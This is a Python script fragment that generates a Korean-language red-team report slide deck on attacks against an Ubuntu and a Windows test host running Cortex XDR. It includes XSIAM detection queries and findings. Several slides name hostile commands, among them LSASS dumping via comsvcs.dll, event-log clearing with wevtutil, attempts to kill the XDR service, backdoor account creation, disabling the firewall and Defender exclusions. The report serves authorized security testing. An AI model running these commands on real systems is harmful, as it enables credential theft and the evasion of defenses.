# ── Ubuntu Slide 2 ─────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Ubuntu – 실행 및 권한 상승 (2/5)',
               'Execution · Privilege Escalation  |  T1505.003 · T1059.004 · T1068 · T1548.003')
attack_table(s, UBU_EXEC_PRIVESC, y0, row_h=0.9)

# ── Ubuntu Slide 3 ─────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Ubuntu – 자격증명 수집 (3/5)',
               'Credential Access  |  T1003.008 · T1078.001 · T1110.002')
attack_table(s, UBU_CRED, y0, row_h=1.0)

# ── Ubuntu Slide 4 ─────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Ubuntu – 지속성 및 방어 회피 (4/5)',
               'Persistence · Defense Evasion  |  T1053.003 · T1548.001 · T1098.004 · T1070.003')
attack_table(s, UBU_PERSIST_EVASION, y0, row_h=0.88)

# ── Ubuntu Slide 5 ─────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Ubuntu – 웹 애플리케이션 공격 (5/5)',
               'Web Exploitation  |  T1190 · T1059.007 · T1083 · T1087 · T1539')
attack_table(s, UBU_WEB, y0, row_h=0.82)

# ── Windows section divider ────────────────────────────────────
s = new_slide()
s.background.fill.solid(); s.background.fill.fore_color.rgb = RGBColor(0x1E,0x3A,0x8A)
textbox(s, 'WINDOWS  172.16.157.187', 1.0, 2.0, 11.3, 1.5,
        size=50, bold=True, color=WHITE, align=PP_ALIGN.CENTER)
textbox(s, 'Cortex XDR ACTIVE  ·  22개 공격 기법', 1.0, 3.6, 11.3, 0.7,
        size=22, color=GRN_LT, align=PP_ALIGN.CENTER)
rect(s, 1.0, 4.5, 11.3, 0.06, GREEN)

# ── Windows Slide 1 ────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Windows – 초기 접근 및 자격증명 수집 (1/6)',
               'Initial Access · Credential Access  |  T1046 · T1021.006 · T1003.001 · T1003.002')
attack_table(s, WIN_INIT_CRED, y0, row_h=0.92)

# ── Windows Slide 2 ────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Windows – 실행 및 AMSI 우회 (2/6)',
               'Execution · Defense Evasion  |  T1059 · T1562.001 · T1027 · T1620')
attack_table(s, WIN_EXEC, y0, row_h=0.9)

# ── Windows Slide 3 – Privilege Escalation (visual) ────────────
s = new_slide()
y0 = title_bar(s, 'Windows – 권한 상승 및 XDR Self-Protection 검증 (3/6)',
               'Privilege Escalation · Impair Defenses  |  T1548.002 · T1562')
attack_table(s, WIN_PRIVESC, y0, row_h=1.0)

# XDR 결과 박스
rect(s, 0.25, 4.2, 12.83, 0.04, GRN_LT)
rect(s, 0.25, 4.3, 12.83, 2.8, GRN_PAL, GREEN, 1.5)
textbox(s, 'Cortex XDR Self-Protection 확인 결과', 0.45, 4.42, 12.4, 0.45,
        size=16, bold=True, color=HDR)
xdr_txt = ('sc.exe stop cyserver       →  [액세스가 거부되었습니다]\n'
           'Stop-Service cyserver      →  [Access Denied]\n'
           'taskkill /PID 5760 /F      →  [액세스가 거부되었습니다]\n'
           'net stop cyserver          →  [시스템 오류 5 - 액세스 거부]')
textbox(s, xdr_txt, 0.45, 4.92, 7.0, 1.9,
        size=12, color=RGBColor(0xDC,0x26,0x26), font='Courier New')
textbox(s, '★  Administrator 권한으로도 XDR 서비스 종료 불가\nSelf-Protection 정상 동작 확인',
        7.8, 4.92, 5.0, 1.5, size=14, bold=True, color=HDR)

# ── Windows Slide 4 ────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Windows – 지속성 (4/6)',
               'Persistence  |  T1053.005 · T1547.001 · T1543.003 · T1136.001')
attack_table(s, WIN_PERSIST, y0, row_h=0.92)

# ── Windows Slide 5 ────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Windows – 방어 회피 · LOLBin · 내부 탐색 (5-6/6)',
               'Defense Evasion · Discovery  |  T1562 · T1112 · T1070 · T1218 · T1018')
attack_table(s, WIN_EVASION, y0, row_h=0.78)

# ── XDR Detection Summary ──────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Cortex XDR 탐지 예상 이벤트 요약', 'Expected XDR Alerts · XSIAM Console Verification')

detected = [
    ('HIGH',   'LSASS 메모리 접근',        'comsvcs.dll MiniDump로 lsass.dmp 생성',   'T1003.001'),
    ('HIGH',   '의심 PE 실행',              'svchost_update.exe PID 46788 / bind.exe XDR 킬', 'T1059.001'),
    ('HIGH',   'AMSI 우회',                'PowerShell amsiInitFailed 리플렉션',       'T1562.001'),
    ('HIGH',   '이벤트 로그 삭제',          'wevtutil cl Security/System/Application', 'T1070.001'),
    ('HIGH',   '백도어 계정 생성',          'net user support + Administrators 추가',  'T1136.001'),
    ('MED',    '스케줄 작업 등록',          'schtasks WindowsUpdate /ru SYSTEM',       'T1053.005'),
    ('MED',    '레지스트리 Run 키',         'HKLM\\..\\Run\\Updater',                  'T1547.001'),
    ('MED',    'WDigest 캐싱 활성화',       'UseLogonCredential = 1',                  'T1112'),
    ('MED',    'certutil/bitsadmin',        '정상 바이너리 이용 페이로드 다운로드',     'T1218'),
    ('LOW',    '방화벽 비활성화',           'netsh advfirewall set allprofiles off',   'T1562.004'),
    ('LOW',    'Defender 제외 경로',        'ExclusionPath C:\\Windows\\Temp',         'T1562.001'),
]
hdrs2 = [('중요도', 0.82), ('감지 이벤트', 2.2), ('세부 내용', 5.5), ('MITRE', 1.1)]
xpos = [0.25, 1.1, 3.35, 8.88]
xwid = [0.82, 2.2, 5.5, 1.1]
for ci, (h, _) in enumerate(hdrs2):
    c = s.shapes.add_table(1, 1,
        Inches(xpos[ci]), Inches(y0),
        Inches(xwid[ci]), Inches(0.38)).table
    _cell(c.cell(0,0), h, HDR, WHITE, size=11, bold=True, align=PP_ALIGN.CENTER)
BG_MAP = {'HIGH': FAIL_BG, 'MED': PART_BG, 'LOW': GRN_PAL}
FG_MAP = {'HIGH': FAIL, 'MED': PART, 'LOW': GREEN}
for ri, (lvl, title, detail, mitre) in enumerate(detected):
    bg = ROW_A if ri % 2 == 0 else ROW_B
    y = y0 + 0.42 + ri * 0.48
    for ci, (xp, xw, txt) in enumerate(zip(xpos, xwid,
            [lvl, title, detail, mitre])):
        t = s.shapes.add_table(1, 1,
            Inches(xp), Inches(y), Inches(xw), Inches(0.45)).table
        cbg = BG_MAP.get(lvl, bg) if ci == 0 else bg
        cfg = FG_MAP.get(lvl, TEXT) if ci == 0 else TEXT
        _cell(t.cell(0,0), txt, cbg, cfg, size=11,
              bold=(ci==0), align=PP_ALIGN.CENTER if ci in (0,3) else PP_ALIGN.LEFT)

# ── XSIAM XQL ─────────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'XSIAM 콘솔 검증 XQL 쿼리', 'XSIAM → Investigate → XQL Query 에서 실행')

queries = [
    ('전체 알림 조회 (Song-Test-oc)',
     'dataset = alerts\n| filter host_name = "Song-Test-oc"\n| fields alert_name, description, action_pretty,\n  actor_process_image_name, event_timestamp\n| sort desc event_timestamp'),
    ('LSASS 접근 이벤트',
     'dataset = xdr_data | filter event_type = "PROCESS"\n  and actor_process_image_name ~= "lsass"\n| fields agent_hostname, actor_process_image_name,\n  action_process_image_name, event_timestamp'),
    ('이벤트 로그 삭제',
     'dataset = xdr_data | filter event_type = "PROCESS"\n  and action_process_image_name ~= "wevtutil"\n| fields agent_hostname,\n  action_process_image_command_line, event_timestamp'),
    ('의심 프로세스 (LOLBin/encoded PS)',
     'dataset = xdr_data | filter event_type = "PROCESS"\n  and (action_process_image_name in ("certutil.exe",\n  "bitsadmin.exe") or\n  action_process_image_command_line ~= "-enc")\n| fields agent_hostname, action_process_image_name,\n  action_process_image_command_line'),
]
for i, (title, q) in enumerate(queries):
    col = i % 2
    row = i // 2
    x = 0.25 + col * 6.55
    y = y0 + row * 2.95
    rect(s, x, y, 6.25, 0.35, GRN_LT)
    textbox(s, title, x+0.1, y+0.03, 6.1, 0.3, size=12, bold=True, color=HDR)
    rect(s, x, y+0.35, 6.25, 2.5, CMD_BG, GREEN, 0.8)
    textbox(s, q, x+0.12, y+0.42, 6.0, 2.35, size=10, color=CMD_TXT, font='Courier New')

# ── Key Findings ───────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, '주요 발견 사항 및 권고사항', 'Key Findings & Security Recommendations')

findings = [
    ('CRITICAL', '양 호스트 모두 Cortex XDR 설치됨에도 LSASS 덤프 / 이벤트 로그 삭제 성공', FAIL, FAIL_BG),
    ('CRITICAL', 'AMSI 우회 성공 → 메모리 기반 페이로드 탐지 공백 존재', FAIL, FAIL_BG),
    ('HIGH',     'LSASS 메모리 덤프 성공 → 자격증명 탈취 후 래터럴 무브 위험',            RGBColor(0xD9,0x77,0x06), PART_BG),
    ('HIGH',     '이벤트 로그 전체 삭제 성공 → 포렌식 조사 불가 상태', RGBColor(0xD9,0x77,0x06), PART_BG),
    ('HIGH',     '백도어 계정 + Administrators 등록 → 독립 재진입 경로 확보', RGBColor(0xD9,0x77,0x06), PART_BG),
    ('MEDIUM',   'Ubuntu DVWA/WebGoat 다중 웹 취약점 (SQLi/XSS/LFI/IDOR) 노출', GREEN, GRN_PAL),
    ('MEDIUM',   'MySQL root 패스워드 없음 → DB 전체 무인증 접근',                    GREEN, GRN_PAL),
    ('CONFIRM',  'XDR Self-Protection 정상 동작 확인 – Administrator도 서비스 종료 불가', HDR, GRN_LT),
    ('CONFIRM',  'bind.exe 실행 시 XDR가 프로세스 자동 차단/종료 확인',              HDR, GRN_LT),
]
for i, (lvl, msg, fg, bg) in enumerate(findings):
    y = y0 + i * 0.62
    rect(s, 0.25, y, 1.2, 0.52, bg, fg, 1.0)
    textbox(s, lvl, 0.25, y+0.03, 1.2, 0.46, size=12, bold=True, color=fg, align=PP_ALIGN.CENTER)
    rect(s, 1.5, y, 11.55, 0.52, RGBColor(0xF9,0xFA,0xFB), GRN_LT, 0.5)
    textbox(s, msg, 1.65, y+0.05, 11.25, 0.44, size=13, color=TEXT)

# ══════════════════════════════════════════════════════════════
out = '/Users/songhyeonsu/Desktop/python/RedTeam_Attack_Report_v2.pptx'
prs.save(out)
print(f'Saved → {out}')
